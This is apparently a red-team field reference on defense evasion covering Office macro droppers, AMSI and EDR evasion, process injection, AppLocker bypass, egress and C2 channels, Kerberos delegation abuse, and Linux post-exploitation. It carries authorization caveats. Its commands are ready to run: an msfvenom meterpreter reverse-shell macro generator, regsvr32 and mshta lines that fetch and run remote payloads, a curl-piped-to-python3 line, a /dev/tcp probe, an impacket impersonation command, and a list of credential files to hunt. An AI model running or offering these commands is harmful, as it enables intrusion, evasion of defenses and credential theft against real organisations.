evasion — defense evasion & breaching-defenses field reference
==============================================================
The "get code running where the defenders don't want it" altitude: client-side
initial access, AV/AMSI evasion, application-allowlist bypass, in-memory execution
and process injection, network-filter/egress bypass, and the advanced AD abuse
that breaching a hardened environment turns on. Companion to offensive/exploitdev
(binary exploitation) and offensive/hacktheplanet (per-service command syntax).

Folds in vim like the others: `vim ~/evasion` (or the `evade` alias), `za`/`zM`/`zR`.

SCOPE FIRST. Evasion is for AUTHORIZED red-team / adversary-emulation engagements
with written ROE. Coordinate with the blue team where the ROE requires it; log
everything (`logshell`). Engagement data -> ~/engagements, never in this repo.

Original notes on standard, publicly-documented technique. The DEFENSIVE mirror —
what each of these trips in Splunk/Sentinel and which Windows event IDs fire — is
in PURPLE-TEAM.md at the repo root. Evasion you can't detect you can't honestly
report on, so read both halves.


Client-side initial access — Office macros & friends
++++++++++++++++++++++++++++++++++++++++
# The #1 breach vector: get a user to run your code. VBA macro that auto-runs and
# stages a payload:
#   Document_Open() / AutoOpen() (Word)  |  Workbook_Open() / Auto_Open() (Excel)
# Tradecraft, not raw payload: pull shellcode in, allocate RWX, run it on a thread
# (the VBA equivalent of a shellcode runner). Obfuscate strings; split API names.
# Generators (for AUTHORIZED tests):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your-ip> LPORT=443 -f vba
#   macro_pack -t WORD -o -G evil.doc        # obfuscates + builds the doc
# Other vectors when macros are blocked:
#   .hta via mshta | .lnk droppers | ISO/IMG container (strips MOTW) | OneNote embeds
#   HTML smuggling (JS rebuilds the payload in-browser to dodge proxy AV)
# Defender's lever: Mark-of-the-Web + "block macros from the internet" kills most of
# this -> attackers pivot to container files that strip MOTW. (See PURPLE-TEAM.md.)
////////////////////////////////////////


AMSI bypass
++++++++++++++++++++++++++++++++++++++++
# AMSI = Antimalware Scan Interface: lets AV scan script/PowerShell/.NET content at
# runtime AFTER deobfuscation. Bypassing it is prerequisite to most in-memory work.
# Classes of bypass (understand the class — signature strings rot fast):
#   - patch amsi.dll!AmsiScanBuffer in-process so it returns a clean result
#   - force an error in the AMSI context so the scan is skipped
#   - run tooling in a runtime/version where AMSI isn't hooked
# Obfuscate the bypass itself (AMSI scans it too): reflection + string-splitting beat
# naive detections; mature EDR catches the memory patch by behavior, not content.
////////////////////////////////////////


Antivirus / EDR evasion — signature vs heuristic vs behavior
++++++++++++++++++++++++++++++++++++++++
# Three detection layers, three different evasions:
#   signature   -> change the bytes: custom encoder, source obfuscation, recompile
#   heuristic   -> avoid suspicious API/entropy patterns; sleep; benign imports
#   behavioral  -> avoid the modeled action: in-memory only, no child process,
#                  direct/indirect syscalls instead of hooked ntdll calls
# Custom shellcode runner is the workhorse (C#/C++): allocate memory, copy shellcode,
# flip protections, execute via a thread/callback/fiber. Keep it off disk; load via
# execute-assembly so no PE hits the filesystem.
# Build/obfuscate helpers (lab + authorized use): ConfuserEx, Donut (PE->shellcode),
# sRDI (DLL->reflective shellcode), ScareCrow / Nimcrypt-style loaders.
# Test against a representative build OFFLINE — never upload samples to public
# multi-scanners that share with vendors (it burns your tooling). Use a local lab.
////////////////////////////////////////


In-memory execution & process injection
++++++++++++++++++++++++++++++++++++++++
# Run code without a payload on disk and, ideally, inside a trusted process.
#   classic injection : VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
#   APC injection     : queue an APC to a thread in an alertable state
#   process hollowing : start a legit proc suspended, unmap its image, map yours, resume
#   reflective DLL    : map+relocate a DLL from memory, no LoadLibrary, no disk
#   module stomping   : overwrite a benign loaded DLL's code with your payload
# Cobalt/Sliver/Meterpreter wrap these as migrate/inject; for OPSEC prefer
# execute-assembly + BOFs (run .NET / position-independent code IN the agent process
# -> no 4688 child-process event). EDR increasingly hooks these APIs -> direct syscalls.
////////////////////////////////////////


Application allow-listing (AppLocker / WDAC) bypass
++++++++++++++++++++++++++++++++++++++++
# When only approved paths/publishers can execute, abuse trusted, signed binaries.
# Default-rule gaps: user-writable dirs that are still allowed to execute, e.g.
#   C:\Windows\Tasks  C:\Windows\Temp  C:\Windows\System32\spool\drivers\color
# LOLBAS executors that run YOUR code under a Microsoft-signed binary (lolbas-project.github.io).
# Examples (one per line — not a single command; see hacktheplanet's LOLBAS fold for syntax):
powershell -ep bypass                                          # if PS is constrained, see CLM note below
regsvr32 /s /n /u /i:http://<your-ip>/x.sct scrobj.dll         # remote scriptlet
mshta http://<your-ip>/x.hta                                   # HTA host
rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe"                # proxy execution
installutil /logfile= /logtoconsole=false /u payload.dll       # .NET installer
msbuild evil.csproj                                            # inline-task runs arbitrary C# — favorite allow-list bypass
# PowerShell Constrained Language Mode (CLM) rides with AppLocker -> break out via a
# custom runspace / C# host (e.g. an unmanaged PowerShell runner) that ignores CLM.
# DLL hijack a whitelisted app, or drop into a path the policy trusts but you can write.
////////////////////////////////////////


Network-filter & egress bypass (C2 channels)
++++++++++++++++++++++++++++++++++++++++
# Hardened egress allows little outbound. Pick a channel the perimeter must permit.
#   HTTPS on 443 with a real cert + sane User-Agent/jitter -> blends with web traffic
#   DNS tunneling -> exfil/C2 where only DNS resolves out (slow but often open)
#   domain fronting / CDN redirectors -> beacon to an allowed front host (concept)
# Practical: malleable C2 profiles to mimic legit apps; long sleep + jitter to beat
# beaconing analytics; redirectors so the real team server never touches the target.
# Find the gap first: which ports/protocols actually egress? proxy in the way?
for p in 53 80 443 8080; do timeout 3 bash -c "echo > /dev/tcp/<your-ip>/$p" && echo "$p open"; done
////////////////////////////////////////


Advanced Active Directory — breaching a hardened domain
++++++++++++++++++++++++++++++++++++++++
# (Roasting / relay / AD CS basics live in hacktheplanet; these are the deeper paths.)
# Kerberos delegation:
#   unconstrained -> capture TGTs of any principal that auths to the host (+ coerce a DC)
#   constrained   -> S4U2self+S4U2proxy to impersonate users to the allowed SPN
#   RBCD          -> write msDS-AllowedToActOnBehalfOfOtherIdentity on a target you control
impacket-getST -spn cifs/<target> -impersonate administrator -dc-ip <dc-ip> <domain>/<acct>:<pw>
# MSSQL trust abuse — linked servers + EXECUTE AS to hop instances and run cmds:
#   enable_xp_cmdshell; EXEC ('...') AT [LINKED]  (PowerUpSQL: Get-SQLServerLinkCrawl)
# Cross-trust / cross-forest: SID history, foreign-group membership, trust-key abuse.
# Token/privilege abuse for local SYSTEM: SeImpersonate -> the Potato family.
####
# OPSEC: most of the above is reachable in-memory via BOFs / execute-assembly — keep
# tooling off disk and out of child processes to stay under the 4688/Sysmon radar.
////////////////////////////////////////


Linux post-exploitation & evasion
++++++++++++++++++++++++++++++++++++++++
# Quieter footholds and persistence on *nix targets:
#   in-memory exec: memfd_create + execveat, or  bash -c 'exec 3<>/dev/tcp/...'
#   no-disk python:  curl -s http://<your-ip>/x.py | python3 -
#   persistence (authorized): systemd user service, cron, ~/.bashrc, SSH authorized_keys
#   tamper logging awareness: /var/log/auth.log, bash history (unset HISTFILE) — note,
#     don't blindly wipe; the report needs an honest record of what you touched.
# Hunt creds/keys: env, ~/.aws, ~/.ssh, .git-credentials, kubeconfig, mounted secrets.
